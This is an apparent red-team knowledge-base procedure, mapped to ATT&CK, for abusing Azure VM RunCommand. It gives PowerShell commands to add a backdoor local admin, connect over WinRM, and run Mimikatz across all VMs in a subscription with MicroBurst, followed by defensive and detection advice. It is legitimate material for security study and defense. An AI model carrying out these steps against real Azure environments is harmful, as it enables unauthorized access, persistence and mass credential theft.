---
type: procedure
verified: true
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/Native API|T1106 - Native API]]'
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques:
  - '[[techniques/Remote Services/Cloud Services|T1021.006 - Cloud Services]]'
tags:
  - '[[tags/Cloud - Azure]]'
  - '[[tags/Virtual Machine RunCommand]]'
commands:
  - '[[commands/get-public-ip-of-azure-vm]]'
  - '[[commands/list-running-azure-vms]]'
  - '[[commands/execute-powershell-script-on-azure-vm-azurerm]]'
  - '[[commands/connect-to-vm-via-winrm]]'
  - '[[commands/execute-powershell-script-on-azure-vm-az]]'
  - '[[commands/execute-mimikatz-on-all-azure-vms-with-microburst]]'
platforms:
  - Cloud
tools:
  - '[[tools/microburst]]'
  - '[[tools/azure-cli]]'
  - '[[tools/azure-powershell]]'
validated: true
---

# Azure VM RunCommand Execution

## Summary

This procedure enables remote code execution on Azure virtual machines (VMs) by leveraging the Azure RunCommand feature to run PowerShell scripts as the SYSTEM user. It is useful for lateral movement in cloud environments, allowing attackers with Azure credentials to execute commands, deploy payloads, or extract credentials across one or multiple VMs without direct network access.

## Description

The Azure RunCommand allows authenticated users to execute scripts on VMs via the Azure API, bypassing traditional remote access methods like RDP or SSH if the VM agent is enabled. This technique targets the Microsoft.Compute/virtualMachines/runCommand/action permission and runs commands in the context of the VM agent, providing high-privilege access. It is particularly effective in hybrid or cloud-only environments for initial foothold expansion or credential dumping. Prerequisites include Azure AD authentication and the Azure PowerShell or CLI tools. Detection focuses on API logs for RunCommand invocations and anomalous PowerShell execution on VMs.

## Requirements

1. Azure AD credentials with Microsoft.Compute/virtualMachines/runCommand/action permission.
2. Azure PowerShell (Az or AzureRm modules) or Azure CLI installed and authenticated (e.g., via Connect-AzAccount).
3. Target VM must have the Azure VM Agent enabled and be running.
4. For WinRM connection: VM must have WinRM enabled and firewall rules allowing port 5985/5986.
5. Local access to a machine for running Azure management commands.

## Defense

- Restrict RunCommand permissions using Azure RBAC, limiting to just-in-time access.
- Enable Azure Activity Logs and monitor for RunCommand API calls via Azure Sentinel or Microsoft Defender for Cloud.
- Implement VM-level defenses like Microsoft Defender for Endpoint to detect anomalous PowerShell execution.
- Use network security groups (NSGs) to block unauthorized WinRM traffic and segment VM access.
- Regularly audit VM agent configurations and disable if not needed.

## Objectives

1. Achieve remote code execution on a single or multiple Azure VMs to deploy payloads or run reconnaissance.
2. Facilitate lateral movement by using extracted credentials or adding backdoor accounts.
3. Extract sensitive data, such as credentials via tools like Mimikatz, from compromised VMs.

## Instructions

### Step 1: List Running Azure VMs

**Context**: Identify available target VMs in the subscription to select for execution. This filters for powered-on instances to ensure RunCommand can be invoked.

**Command** ([[commands/list-running-azure-vms]]):
```powershell
Get-AzureRmVM -Status | Where-Object {$_.PowerState -eq "VM running"} | Select-Object ResourceGroupName, Name
```

This command queries the AzureRm module to list VMs. Replace with Az module equivalent if using newer tooling. Expected output is a table of resource groups and VM names.

### Step 2: Retrieve Public IP of Target VM

**Context**: Obtain the public IP address of the selected VM for potential direct connections like WinRM, by querying the network interface and public IP resources.

**Command** ([[commands/get-public-ip-of-azure-vm]]):
```powershell
Get-AzVM -Name <VM-NAME> -ResourceGroupName <RESOURCE-GROUP> | Select-Object -ExpandProperty NetworkProfile
Get-AzNetworkInterface -Name <NIC-NAME>
Get-AzPublicIpAddress -Name <PUBLIC-IP-NAME>
```

Chain these commands to drill down from VM to network profile, then NIC, and finally the public IP. Use the output IP for subsequent connections. Success is confirmed by retrieving a valid IPv4 address.

### Step 3: Execute PowerShell Script on Single VM Using AzureRm

**Context**: Run a custom PowerShell script on a specific VM to perform actions like adding a local admin user, using the older AzureRm module for compatibility with legacy environments.

**Command** ([[commands/execute-powershell-script-on-azure-vm-azurerm]]):
```powershell
Invoke-AzureRmVMRunCommand -ResourceGroupName <RESOURCE-GROUP> -VMName <VM-NAME> -CommandId RunPowerShellScript -ScriptPath <SCRIPT-PATH>
```

Prepare the script file (e.g., adduser.ps1) locally, then invoke it. The script runs as SYSTEM on the VM. Verify success by checking Azure activity logs or subsequent VM access.

**Code** ([[codes/powershell-create-local-admin-user]]):
Embed the script content here for reference, but save as a .ps1 file and reference its path.

### Step 4: Connect to VM via WinRM

**Context**: After gaining credentials or adding a backdoor account, establish an interactive session to the VM using WinRM for direct control and further post-exploitation.

**Command** ([[commands/connect-to-vm-via-winrm]]):
```powershell
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('username', $password)
$sess = New-PSSession -ComputerName <VM-IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
```

Use credentials from prior steps (e.g., the new local admin). This creates a remote PowerShell session. If connection fails, check WinRM configuration on the VM.

### Step 5: Execute PowerShell Script on Single VM Using Az Module

**Context**: Alternative to Step 3 using the modern Az module for running scripts on a VM, suitable for newer Azure environments.

**Command** ([[commands/execute-powershell-script-on-azure-vm-az]]):
```powershell
Invoke-AzVMRunCommand -VMName <VM-NAME> -ResourceGroupName <RESOURCE-GROUP> -CommandId 'RunPowerShellScript' -ScriptPath '<SCRIPT-PATH>' -Verbose
```

Similar to the AzureRm version but uses current cmdlets. Enable Verbose for detailed output. Confirm execution via returned job status.

### Step 6: Execute Mimikatz on All Azure VMs Using MicroBurst

**Context**: Scale execution across all VMs in the subscription to dump credentials en masse, using the MicroBurst module for bulk operations.

First, install and import MicroBurst if needed (see [[tools/microburst]]).

**Command** ([[commands/execute-mimikatz-on-all-azure-vms-with-microburst]]):
```powershell
Import-Module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -Output Output.txt
```

Prepare Mimikatz.ps1 locally. This runs the script on all accessible VMs. Review Output.txt for results, including any errors per VM.
